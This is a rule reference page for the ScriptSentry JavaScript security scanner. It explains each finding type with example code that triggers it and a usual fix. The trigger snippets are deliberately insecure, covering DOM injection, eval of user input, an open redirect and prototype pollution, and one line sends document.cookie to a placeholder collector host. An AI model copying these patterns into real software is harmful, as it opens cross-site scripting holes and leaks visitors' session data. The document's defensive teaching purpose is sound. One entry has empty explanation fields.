# Rule reference

What every ScriptSentry finding means, how severe it is, and what the
fix usually looks like. **Generated from the engine's own rule
registry** (`core/reporter.py` `PLAIN_TERMS`) by `tools/build_rules_page.py`
— the docs and the reports always speak the same language.

Severity is the *default* label; the scanner can raise or lower it per
finding based on evidence and confidence. Observations are behaviour
worth knowing about, not confirmed problems.

## Actionable findings

### `dom_injection` — DOM injection

**Default severity:** HIGH · **Kind:** Actionable finding

**What it means.** The code inserts information taken from the page address or user input directly into the page without cleaning it first. An attacker can craft a link that makes the page run their own script in a visitor's browser (a common attack called cross-site scripting).

**What to do.** Clean the value before it is inserted into the page, or use a safer rendering method. The security team should verify the listed lines.

Example that triggers it:

```js
const q = new URLSearchParams(location.search).get('q');
el.innerHTML = q;
```

The usual fix:

```js
el.textContent = q;  // or sanitize with DOMPurify before innerHTML
```

### `dom_injection_document_write` — DOM injection (document.write)

**Default severity:** HIGH · **Kind:** Actionable finding

**What it means.** The code writes information taken from the page address or user input straight into the document. A crafted link can make a visitor's browser run attacker-controlled script (cross-site scripting).

**What to do.** Avoid writing raw input into the document; render cleaned values only.

Example that triggers it:

```js
document.write('<b>' + location.hash.slice(1) + '</b>');
```

The usual fix:

```js
const el = document.createElement('b');
el.textContent = location.hash.slice(1);
document.body.appendChild(el);
```

### `hardcoded_secret` — Hardcoded secret candidate

**Default severity:** HIGH · **Kind:** Actionable finding

**What it means.** A credential (password, API key or token) appears in plain text inside the shipped code. Anyone who can view or download the code - including this scan - can read it.

**What to do.** Move the credential to a secure configuration store and replace the exposed one; assume it is compromised once it has shipped.

Example that triggers it:

```js
const apiKey = "kx9vQm2LpTn8Rb4Wc6Yd3Zf7Hj5";
fetch('https://api.example.com/v2?key=' + apiKey);
```

The usual fix:

```js
// Read the key from server-side configuration instead:
// fetch('/api/keys/current')  -- the secret never ships in the bundle
```

### `data_exfiltration_flow` — Sensitive data sent to a network sink

**Default severity:** HIGH · **Kind:** Actionable finding

**What it means.** The code reads private information (login details, cookies, form input) and sends it to an external destination. If that destination is not yours or not expected, this is how data leaks happen.

**What to do.** Confirm the destination is legitimate and intended; remove or gate the transfer if it is not.

Example that triggers it:

```js
fetch('https://collector.example/log?c=' + document.cookie);
```

The usual fix:

```js
// Remove the call, or gate it to your own origin with the
// minimum data it actually needs.
```

### `open_redirect` — Client-side open redirect

**Default severity:** HIGH · **Kind:** Actionable finding

**What it means.** The code sends visitors to whatever address is in the link, without checking it. Attackers use this to wrap phishing pages in your site's trusted name.

**What to do.** Only allow redirects to a list of approved addresses.

Example that triggers it:

```js
const next = new URLSearchParams(location.search).get('next');
location = next;
```

The usual fix:

```js
const ALLOWED = new Set(['/dashboard', '/profile']);
if (ALLOWED.has(next)) location = next;  // allowlist, never a raw value
```

### `dangerous_dynamic_code` — Dangerous dynamic code execution

**Default severity:** HIGH · **Kind:** Actionable finding

**What it means.** The code constructs program instructions from text at run time. If any part of that text comes from outside, an attacker may be able to run their own instructions.

**What to do.** Remove the dynamic execution, or make sure its input can never be influenced from outside.

Example that triggers it:

```js
eval(userInput);
setTimeout('go(' + input + ')', 100);
window[String.fromCharCode(101,118,97,108)](payload);
```

The usual fix:

```js
JSON.parse(input);            // for data
setTimeout(() => go(input), 100);  // for behaviour: pass a function
```

### `vulnerable_dependency` — Vulnerable dependency (npm advisory)

**Default severity:** HIGH · **Kind:** Actionable finding

**What it means.** 

**What to do.** 

Example that triggers it:

```js
// package.json
"dependencies": { "left-pad": "1.0.0" }  // matches a known advisory
```

The usual fix:

```js
npm audit fix  // or pin a patched version and verify the upgrade
```

### `exposed_key_iv_pair` — Exposed key + IV pair

**Default severity:** MEDIUM · **Kind:** Actionable finding

**What it means.** Both the encryption key and its starting value are in the shipped code. Encryption with a visible key protects nothing.

**What to do.** Move the key somewhere safe; treat data encrypted with it as exposed.

Example that triggers it:

```js
const key = '0123456789abcdef';
const iv  = 'abcdef9876543210';
```

The usual fix:

```js
// Hardcoding the IV alongside the key defeats its purpose.
// Generate a random IV per message and send it alongside the ciphertext.
```

### `static_crypto_key` — Static cryptographic key

**Default severity:** MEDIUM · **Kind:** Actionable finding

**What it means.** A fixed encryption key is embedded in the code where anyone reading it can copy it.

**What to do.** Move the key to a secure store and rotate it.

Example that triggers it:

```js
const key = CryptoJS.enc.Utf8.parse('my-secret-key-123');
```

The usual fix:

```js
// Move encryption to the server, or derive keys per session
// via the WebCrypto API -- never embed the key in shipped code.
```

### `insecure_postmessage` — Insecure postMessage (wildcard origin)

**Default severity:** MEDIUM · **Kind:** Actionable finding

**What it means.** The code sends a message to another window and explicitly allows ANY origin to receive it. If the receiving page is ever embedded by an attacker-controlled page, that page receives the message too.

**What to do.** Name the exact origin instead of the wildcard, and validate the payload on the receiving side.

Example that triggers it:

```js
window.parent.postMessage(session, '*');
```

The usual fix:

```js
window.parent.postMessage(session, 'https://app.example.com');
```

### `prototype_pollution` — Prototype pollution pattern

**Default severity:** MEDIUM · **Kind:** Actionable finding

**What it means.** The code merges or writes objects in a way that can modify JavaScript's shared prototypes when the input comes from the page address or user data. Successful pollution can change application logic everywhere.

**What to do.** Validate untrusted objects against a schema and reject keys like __proto__ and constructor before merging.

Example that triggers it:

```js
Object.assign(cfg, JSON.parse('{' + location.hash.slice(1) + '}'));
```

The usual fix:

```js
// Validate untrusted objects against a schema and reject
// __proto__/constructor keys before merging.
```

### `jquery_dom_manipulation` — jQuery DOM manipulation with untrusted data

**Default severity:** MEDIUM · **Kind:** Actionable finding

**What it means.** jQuery DOM methods that interpret HTML are fed data that may come from the page address or user input -- the jQuery sibling of DOM injection.

**What to do.** Use .text() for plain values, or sanitize with DOMPurify before calling .html()/.append() with markup.

Example that triggers it:

```js
$('#output').html(decodeURI(location.hash));
```

The usual fix:

```js
$('#output').text(decodeURI(location.hash));
```

## Observations

### `data_exfiltration_candidate` — URL-derived data sent to an external destination

**Default severity:** LOW · **Kind:** Observation

**What it means.** The code both reads private information and contacts external services. This is only a pattern match - it may be perfectly normal - but the combination is worth checking.

**What to do.** Have the security team confirm where the data actually goes.

Example that triggers it:

```js
fetch('https://cdn.example.com/track?from=' + location.href);
```

The usual fix:

```js
// Review: URL data to a third party is often analytics, not a leak.
```

### `sensitive_storage` — Sensitive value in browser storage

**Default severity:** MEDIUM · **Kind:** Observation

**What it means.** The code stores sensitive-looking information in the browser's storage. Anything stored there can be read by other scripts on the page.

**What to do.** Store only what is necessary, and prefer server-side sessions.

Example that triggers it:

```js
localStorage.setItem('authToken', token);
```

The usual fix:

```js
// XSS makes localStorage readable; prefer httpOnly cookies
// for anything that authenticates a user.
```

### `unsafe_runtime` — Risky runtime pattern

**Default severity:** LOW · **Kind:** Observation

**What it means.** The code uses mechanisms that build or run instructions dynamically - legitimate in some cases, dangerous if the input is ever influenced by an outsider.

**What to do.** Security team: check whether outside input can reach these calls.

Example that triggers it:

```js
new Function(decodeURIComponent(payload))();
```

The usual fix:

```js
// Static pattern only: confirm what executes and prefer explicit code.
```

### `api_surface` — API surface mapped

**Default severity:** INFO · **Kind:** Observation

**What it means.** An inventory observation: the code calls endpoints that look like an API. Not a vulnerability by itself -- the map exists so endpoints can be reviewed for server-side authorization and rate limiting.

**What to do.** Use the API map to review each endpoint: does it need auth? Does it rate-limit? Is it still supposed to exist?

Example that triggers it:

```js
fetch('https://api.example.com/v2/users?page=2');
```

The usual fix:

```js
// Inventory only: use the API map to spot endpoints that
// should require server-side authorization.
```

### `obfuscation` — Obfuscation indicators

**Default severity:** LOW · **Kind:** Observation

**What it means.** The code uses encoding and string-building patterns typical of obfuscated bundles. Obfuscation is not malicious by itself, but it hides behaviour from review.

**What to do.** Beautify and deobfuscate the bundle, then re-scan the readable code before trusting it.

Example that triggers it:

```js
var _0x1a2b = ['\x61\x6c\x65\x72\x74'];
```

The usual fix:

```js
// Flagged for review: obfuscation hides behaviour.
// Beautify and deobfuscate before trusting the code.
```

### `client_side_crypto` — Client-side cryptography in use

**Default severity:** INFO · **Kind:** Observation

**What it means.** An inventory observation: cryptographic work happens in the browser. Fine for checksums and local scrambling; never a substitute for server-side secrecy.

**What to do.** Anything encrypted in the client is visible to a determined user -- keep real secrets on the server.

Example that triggers it:

```js
const hash = CryptoJS.SHA256(input).toString();
```

The usual fix:

```js
// Fine for checksums; never a substitute for server-side
// secrecy -- anything in the client is visible to the user.
```

## Legacy ids

- `dom_xss` — older reports used this id for DOM injection findings.
- `secret` — value-shape secret hits reported before the id was split.
